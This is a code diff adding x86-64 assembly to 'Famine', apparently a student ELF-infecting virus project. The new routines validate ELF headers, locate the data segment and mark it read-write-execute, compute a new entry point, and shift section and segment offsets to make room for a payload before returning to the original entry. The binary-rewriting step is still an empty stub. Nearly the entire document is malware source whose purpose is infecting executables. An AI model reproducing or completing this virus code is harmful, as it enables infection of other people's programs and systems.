@@ -5,8 +5,17 @@ global _start
 
 _start:
 	PUSHAQ
-	mov rbp, rsp
 	jmp main
+
+memcpy:
+	enter 0, 0
+	leave
+	ret
+
+memset:
+	enter 0, 0
+	leave
+	ret
 
 strcmp:
 	enter 0, 0
@@ -91,24 +100,316 @@ puts:
 	leave
 	ret
 
+check_addr:		;	rdi:elf_struc  rsi:addr
+	enter 0, 0
+	push r13
+	mov r13, QWORD[rdi + elf_struc.ptr_end]
+	mov rdi, QWORD[rdi + elf_struc.ptr]
+	cmp rsi, rdi
+	jl check_addr_ret_0
+	cmp rsi, r13
+	jg check_addr_ret_0
+	mov rax, 1
+	jmp check_addr_ret
+	check_addr_ret_0:
+	mov rax, 0
+	check_addr_ret:
+	pop r13
+	leave
+	ret
+
+check_str_in_addr:	; rdi:elf_struc rsi:str
+	enter 0, 0
+	chk_one_byte:
+	push rdi
+	push rsi
+	call check_addr
+	pop rsi
+	pop rdi
+	cmp rax, 0
+	je ret_0
+	mov al, BYTE[rsi]
+	inc rsi
+	cmp al, 0
+	jne chk_one_byte
+	mov rax, 1
+	leave
+	ret
+
+modify_sections:
+	enter 0, 0
+	mov r8, rdi									;r8 contient elf_struc
+	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
+	xor r10, r10
+	mov r10, QWORD[r9 + ehdr.e_shoff]
+	add r10, r9									;r10 contient les shdr
+
+	mov r11, QWORD[r8 + elf_struc.data_phdr]
+	mov r12, QWORD[r11 + phdr.p_offset]
+	add r12, QWORD[r11 + phdr.p_filesz]
+	mov r11, r12								;r11 contient l'addr ou le code sera inséré
+	xor rcx, rcx
+	mov cx, WORD[r9 + ehdr.e_shnum]
+	xor rbx, rbx
+	dec rbx
+	while_shdr_to_modify:
+		inc rbx
+		cmp rbx, rcx
+		je end_while_data_shdr
+		mov rax, SHDR_SIZE
+		mul rbx
+		lea rdi, [r10 + rax]	; rdi: current shdr
+
+		xor rdx, rdx
+		mov edx, DWORD[rdi + shdr.sh_name]
+		mov rsi, QWORD[r8 + elf_struc.shdr_names]
+		add rsi, rdx			;rsi has the sct name sct name
+
+		push rdi
+		lea rdi, [rel bss_name]
+		call strcmp
+		pop rdi
+		cmp rax, 0
+		je while_shdr_to_modify ; if not bss section
+		mov rax, QWORD[rdi + shdr.sh_offset]
+		cmp rax, r11
+		jl while_shdr_to_modify ; if shdr.offset >= dataphdr.offset + dataphdr.filesz
+			mov rax, QWORD[r8 + elf_struc.bits_added]
+			add QWORD[rdi + shdr.sh_offset], rax
+			mov rax, QWORD[rdi + shdr.sh_addr]
+			cmp rax, 0
+			je while_shdr_to_modify
+				mov rax, QWORD[r8 + elf_struc.bits_added]
+				add QWORD[rdi + shdr.sh_addr], rax
+		jmp while_shdr_to_modify
+	end_while_shdr_to_modify:
+	mov rax, 1
+	leave
+	ret
+
+modify_segements:
+	enter 0, 0
+	mov r8, rdi									;r8 contient elf_struc
+	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
+	xor r10, r10
+	mov r10, QWORD[r9 + ehdr.e_phoff]
+	add r10, r9									;r10 contient les phdr
+	mov QWORD[r8 + elf_struc.data_phdr], 0
+
+	mov rdi, r8
+	mov rsi, r10
+	call check_addr								;check phoff addr
+	cmp rax, 0
+		je ret_0
+
+	xor rcx, rcx
+	mov cx, WORD[r9 + ehdr.e_phnum]
+	mov rax, PHDR_SIZE
+	mul rcx
+	lea rsi, [r10 + rax]
+	mov rdi, r8
+	call check_addr
+	cmp rax, 0
+		je ret_0								;check all phdr
+
+	xor rcx, rcx
+	mov cx, WORD[r9 + ehdr.e_phnum]
+	xor rbx, rbx
+	dec rbx
+	while_data_phdr:
+		inc rbx
+		cmp rbx, rcx
+		je end_while_data_shdr
+		mov rax, PHDR_SIZE
+		mul rbx
+		lea rdi, [r10 + rax]	; rdi: current phdr
+
+		mov eax, DWORD[rdi + phdr.p_type]
+		cmp eax, 1
+		jne end_if_data_phdr1
+		mov r11, QWORD[rdi + phdr.p_offset]
+		mov r12, QWORD[r8 + elf_struc.data_shdr]
+		mov r12, QWORD[r12 + shdr.sh_offset]
+		cmp r11, r12
+		jg end_if_data_phdr1
+		add r11, QWORD[rdi + phdr.p_filesz]
+		cmp r11, r12
+		jl end_if_data_phdr1						; if phdr is data phdr
+			mov DWORD[rdi + phdr.p_flags], 7
+			mov QWORD[r8 + elf_struc.data_phdr], rdi ; data_phdr = phdr;
+			mov rax, QWORD[rdi + phdr.p_vaddr]
+			add rax, QWORD[rdi + phdr.p_memsz]
+			mov QWORD[r8 + elf_struc.new_entry], rax ; new_entry = phdr->p_vaddr + phdr->p_memsz;
+			mov rax, QWORD[rdi + phdr.p_memsz]
+			sub rax, QWORD[rdi + phdr.p_filesz]
+			mov QWORD[r8 + elf_struc.bss_size], rax ; bss_size = phdr->p_memsz - phdr->p_filesz;
+			add	QWORD[r8 + elf_struc.bits_added], rax ; bits_added += bss_size;
+			mov rax, QWORD[rdi + phdr.p_offset]
+			add rax, QWORD[rdi + phdr.p_filesz]
+			mov QWORD[r8 + elf_struc.new_code_offset], rax ; new_code_offset = phdr->p_offset + phdr->p_filesz;
+			jmp while_data_phdr
+		end_if_data_phdr1:
+		mov rax, QWORD[r8 + elf_struc.data_phdr]
+		cmp rax, 0
+		je end_if_data_phdr2
+		mov r11, QWORD[rax + phdr.p_offset]
+		add r11, QWORD[rax + phdr.p_filesz]
+		mov rax, QWORD[rdi + phdr.p_offset]
+		cmp rax, r11
+		jg end_if_data_phdr2
+			mov rax, QWORD[r8 + elf_struc.bits_added]
+			mov QWORD[rdi + phdr.p_offset], rax
+			mov rax, QWORD[rdi + phdr.p_vaddr]
+			cmp rax, 0
+			jmp end_if_data_phdr2
+			mov rax, QWORD[r8 + elf_struc.bits_added]
+			add QWORD[rdi + phdr.p_vaddr], rax
+			add QWORD[rdi + phdr.p_paddr], rax
+		end_if_data_phdr2:
+		jmp while_data_phdr
+	end_while_data_phdr:
+	mov rax, QWORD[r8 + elf_struc.data_phdr]
+	leave
+	ret
+
+fill_data_sec:
+	enter 0, 0
+	mov r8, rdi									;r8 contient elf_struc
+	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
+	xor r10, r10
+	mov r10, QWORD[r9 + ehdr.e_shoff]
+	add r10, r9									;r10 contient les shdr
+	mov QWORD[r8 + elf_struc.data_shdr], 0
+
+	mov rsi, r10
+	mov rdi, r8
+	call check_addr
+	cmp rax, 0
+		je ret_0
+
+	xor rcx, rcx
+	mov cx, WORD[r9 + ehdr.e_shnum]
+	mov rax, SHDR_SIZE
+	mul rcx
+
+	lea rsi, [r10 + rax]
+	mov rdi, r8
+	call check_addr
+	cmp rax, 0
+		je ret_0
+	; all sections are tested
+
+	xor rcx, rcx
+	mov bx, WORD[r9 + ehdr.e_shnum]
+	mov cx, WORD[r9 + ehdr.e_shstrndx]
+	cmp cx, bx
+		jge ret_0
+	mov rax, SHDR_SIZE
+	mul rcx
+	lea rax, [r10 + rax]
+	mov rsi, [rax + shdr.sh_offset]
+	lea rsi, [r9 + rsi]
+	mov QWORD[r8 + elf_struc.shdr_names], rsi
+	mov rdi, r8
+	call check_addr
+	cmp rax, 0
+		je ret_0
+
+	xor rcx, rcx
+	mov cx, WORD[r9 + ehdr.e_shnum]
+	xor rbx, rbx
+	dec rbx
+	while_data_shdr:
+		inc rbx
+		cmp rbx, rcx
+		je end_while_data_shdr
+		mov rax, SHDR_SIZE
+		mul rbx
+		lea rdi, [r10 + rax]	; rdi: current shdr
+		push rdi
+
+		xor rdx, rdx
+		mov edx, DWORD[rdi + shdr.sh_name]
+		mov rsi, QWORD[r8 + elf_struc.shdr_names]
+		add rsi, rdx
+		push rsi
+		mov rdi, r8
+		call check_str_in_addr	; check if str has good addresses
+		pop rdi
+		cmp rax, 0
+		je end_while_data_shdr
+		
+		lea rsi, [rel data_name]
+		call strcmp
+		cmp rax, 0
+		pop rdi
+		jne while_data_shdr
+		mov QWORD[r8 + elf_struc.data_shdr], rdi
+		jmp while_data_shdr
+	end_while_data_shdr:
+
+	mov rax, QWORD[r8 + elf_struc.data_shdr]
+	leave
+	ret
+
+rewrite_binary:
+	enter 0, 0
+	leave
+	ret
+
 infect_elf:		; r8:elf_struc
 	enter 0, 0
 	mov r8, rdi
 	mov rax, QWORD[r8 + elf_struc.stat + stat.st_size]
-	cmp rax, 64
+	cmp rax, 64								; test if ehdr is in the file
 	jl infect_elf_end
 	mov rdi, QWORD[r8 + elf_struc.ptr]
 	mov QWORD[r8 + elf_struc.ehdr], rdi
+	mov rsi, QWORD[r8 + elf_struc.stat + stat.st_size]
+	add rdi, rsi
+	mov QWORD[r8 + elf_struc.ptr_end], rdi  ; fill ptr_end
 
 	mov rdi, QWORD[r8 + elf_struc.ehdr]
-	mov dil, BYTE[rdi + ehdr.ei_class]
-	cmp dil, 2
-	jne infect_elf_end 
+	mov edi, DWORD[rdi + ehdr.ei_mag]
+	cmp edi, 0x464c457f
+	jne infect_elf_end						; check magic number
 
+	mov rdi, QWORD[r8 + elf_struc.ehdr]
+	mov sil, BYTE[rdi + ehdr.ei_class]
+	cmp sil, 2								; check 64 bits
+	jne infect_elf_end
+
+	mov si, WORD[rdi + ehdr.e_type]
+	cmp si, 2
+	je continue_infection
+	cmp si, 3								; check elf type
+	je continue_infection
+	jmp infect_elf_end
+
+	continue_infection:
+	mov QWORD[r8 + elf_struc.bits_added], PAYLOAD_SIZE		; bits_added = sizeof(payload)
+	mov rax, QWORD[r8 + elf_struc.ehdr]
+	mov rax, QWORD[rax + ehdr.e_entry]
+	mov QWORD[r8 + elf_struc.old_entry], rax				; old_entry = sizeof(payload)
+	mov rdi, r8
+	call fill_data_sec
+	cmp rax, 0
+	je infect_elf_end
+
+	mov rdi, r8
+	call modify_segements
+	cmp rax, 0
+	je infect_elf_end
+
+	mov rdi, r8
+	call modify_sections
+
+	mov rdi, r8
+	call rewrite_binary
 
 	mov rdi, QWORD[r8 + elf_struc.path]
 	call puts
-	
+
 	infect_elf_end:
 	leave
 	ret
@@ -361,6 +662,16 @@ main:
 	call process_dir
 	jmp jmp_old_entry
 
+ret_0:
+	mov rax, 0
+	leave
+	ret
+
+ret_1:
+	mov rax, 1
+	leave
+	ret
+
 jmp_old_entry:
 	mov rdi, 0x1111111111111111
 	mov rsi, 0x1111111111111111
@@ -373,10 +684,8 @@ jmp_old_entry:
 	lea rax, [rel _start]
 	sub rax, rdi
 	POPAQ
-	jmp rdi
+	jmp rax
 
-signature:
-	db 'Famine version 1.0 (c)oded by gdelabro', 0
 dir1:
 	db '/tmp/test/', 0
 dir2:
@@ -393,4 +702,10 @@ dot:
 	db ".", 0
 ddot:
 	db "..", 0
+data_name:
+	db ".data", 0
+bss_name:
+	db ".bss", 0
+signature:
+	db 'Famine version 1.0 (c)oded by gdelabro', 0
 end:
